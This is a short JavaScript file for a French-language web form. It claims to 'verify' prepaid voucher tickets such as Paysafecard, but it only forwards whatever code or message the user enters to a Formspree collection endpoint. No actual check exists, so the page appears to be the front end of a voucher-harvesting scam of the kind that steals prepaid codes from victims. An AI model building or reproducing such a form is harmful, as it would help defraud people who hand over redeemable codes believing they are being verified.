document.addEventListener("DOMContentLoaded", () => {

  const providers = document.querySelectorAll(".provider");
  const selectedProvider = document.getElementById("selectedProvider");
  const providerInput = document.getElementById("providerInput");

  const form = document.getElementById("verificationForm");
  const verifyBtn = document.getElementById("verifyBtn");
  const result = document.getElementById("result");

  /*
   * CHOIX DU FOURNISSEUR
   */

  providers.forEach(button => {

    button.addEventListener("click", () => {

      providers.forEach(item => {
        item.classList.remove("active");
      });

      button.classList.add("active");

      const provider = button.dataset.provider;

      selectedProvider.textContent = provider;
      providerInput.value = provider;

      result.className = "result hidden";
      result.innerHTML = "";
    });

  });


  /*
   * ENVOI DU FORMULAIRE
   */

  form.addEventListener("submit", async (event) => {

    event.preventDefault();

    const message = document.getElementById("message").value.trim();

    if (!message) {

      result.className = "result error";

      result.innerHTML =
        "⚠️ Veuillez écrire une référence ou un message.";

      return;
    }

    verifyBtn.disabled = true;
    verifyBtn.textContent = "⏳ Envoi en cours...";

    result.className = "result hidden";
    result.innerHTML = "";

    try {

      const response = await fetch(form.action, {
        method: "POST",
        body: new FormData(form),
        headers: {
          "Accept": "application/json"
        }
      });

      if (response.ok) {

        result.className = "result success";

        result.innerHTML = `
          ✅ <strong>Demande envoyée !</strong><br><br>
          Votre demande a bien été transmise.
        `;

        form.reset();

        providerInput.value = "Paysafecard";
        selectedProvider.textContent = "Paysafecard";

        providers.forEach(item => {
          item.classList.remove("active");
        });

        providers[0].classList.add("active");

      } else {

        throw new Error("Erreur lors de l'envoi.");

      }

    } catch (error) {

      result.className = "result error";

      result.innerHTML = `
        ❌ <strong>Impossible d'envoyer la demande.</strong><br><br>
        Vérifiez votre configuration Formspree.
      `;

    }

    verifyBtn.disabled = false;
    verifyBtn.textContent = "🔍 Vérifier le ticket";

  });

});
